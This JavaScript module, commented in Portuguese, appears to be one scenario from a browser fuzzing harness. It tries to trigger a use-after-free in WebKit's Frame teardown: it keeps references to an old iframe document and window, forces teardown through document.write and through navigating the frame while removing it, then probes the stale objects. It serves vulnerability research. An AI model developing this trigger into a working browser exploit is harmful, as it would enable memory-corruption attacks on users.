/**
 * CENÁRIO: IFRAME_DOCWRITE_FRAME_UAF
 * Superfície C++: FrameLoader.cpp / Frame.cpp / DocumentWriter.cpp
 * Risco: HIGH
 *
 * Diferença para a versão genérica:
 *   - Versão anterior fazia document.write() na mesma origem, onde o WebKit
 *     pode reutilizar o Frame em vez de destruir e recriar — sem UAF real.
 *   - Versão robusta testa dois vetores de teardown do Frame:
 *     (A) navigate para about:blank (destrói Frame atual, cria novo)
 *     (B) document.write() com conteúdo que muda o charset (força parser reset)
 *   - Captura refs para oldDoc e oldWin ANTES do teardown, então faz
 *     probes extensivas para detectar acesso ao Frame antigo freed.
 *   - Adiciona probes em propriedades de navegação (history, location)
 *     que apontam diretamente para estruturas C++ do Frame.
 *   - Usa iframe removido do DOM durante o navigate (double free path).
 *
 * Ciclo de vida C++ relevante:
 *   iframe.src = 'about:blank' → FrameLoader::load() → Frame antigo destroyed
 *   oldDoc ainda referenciado pelo JS → Document::m_frame (freed Frame*)
 *   oldWin.location → acessa LocalDOMWindow::m_frame (freed Frame*)
 */

export default {
    id:       'IFRAME_DOCWRITE_FRAME_UAF',
    category: 'DOM',
    risk:     'HIGH',
    description:
        'document.write() e navigate forçam teardown do Frame nativo. ' +
        'Refs JS para oldDoc/oldWin retidas pré-teardown acessam Frame freed. ' +
        'Testa document.write() com charset-reset e navigate para about:blank. ' +
        'Probes em location, history e navigator apontam para structs C++ do Frame.',

    setup: async function() {
        this.iframe = document.createElement('iframe');
        this.iframe.style.cssText = 'width:200px;height:100px;position:absolute;top:0;left:0';
        document.body.appendChild(this.iframe);

        // Aguarda iframe carregar para garantir que o Frame C++ está inicializado
        await new Promise(resolve => {
            if (this.iframe.contentDocument?.readyState === 'complete') return resolve();
            this.iframe.addEventListener('load', resolve, { once: true });
            this.iframe.src = 'about:blank';
        });

        // Captura referências ANTES do teardown — essas vão ser as "dangling refs"
        this.oldWin = this.iframe.contentWindow;
        this.oldDoc = this.iframe.contentDocument;

        // Cria alguns nós no documento original para testar acesso pós-free
        try {
            this.oldDoc.body.innerHTML = '<div id="orig">original</div><span>test</span>';
            this.origEl = this.oldDoc.getElementById('orig');
        } catch(e) {}
    },

    trigger: async function() {
        // VETOR A: document.write() com charset diferente — força DocumentWriter reset
        try {
            this.oldDoc.open('text/html', 'replace');
            this.oldDoc.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head>'
                + '<body><p id="new">REWRITTEN</p></body></html>');
            this.oldDoc.close();
        } catch(e) {}

        await new Promise(r => setTimeout(r, 20));

        // VETOR B: navigate para nova URL — destrói Frame e cria outro
        // Remove do DOM durante o navigate (double free path)
        this.iframe.src = 'about:blank#fuzztarget';
        this.iframe.remove(); // Remove durante o navigate

        await new Promise(r => setTimeout(r, 30));
    },

    probe: [
        // Acesso ao Document antigo freed via oldDoc
        s => s.oldDoc.readyState,
        s => s.oldDoc.URL,
        s => s.oldDoc.documentURI,
        s => s.oldDoc.characterSet,
        s => s.oldDoc.contentType,
        s => s.oldDoc.body?.innerHTML,
        s => s.oldDoc.body?.childElementCount,
        s => s.oldDoc.documentElement?.outerHTML?.length,
        s => s.oldDoc.getElementById?.('new'),       // Elemento do documento reescrito
        s => s.oldDoc.getElementById?.('orig'),      // Elemento do documento ANTIGO
        s => s.oldDoc.querySelector?.('p')?.id,
        s => s.oldDoc.title,
        s => s.oldDoc.cookie,

        // Acesso à Window antiga freed via oldWin
        // location e history apontam para structs C++ do Frame
        s => s.oldWin.location?.href,
        s => s.oldWin.location?.origin,
        s => s.oldWin.history?.length,
        s => s.oldWin.closed,
        s => s.oldWin.name,

        // Verifica se o documento mudou (indica que a ref apontou para o novo Frame)
        s => s.oldWin.document === s.iframe.contentDocument,

        // Acesso ao nó original — pode estar em heap freed
        s => s.origEl?.isConnected,
        s => s.origEl?.ownerDocument === s.oldDoc,
        s => s.origEl?.getRootNode(),
    ],

    cleanup: function() {
        try { this.iframe.remove(); } catch(e) {}
    }
};
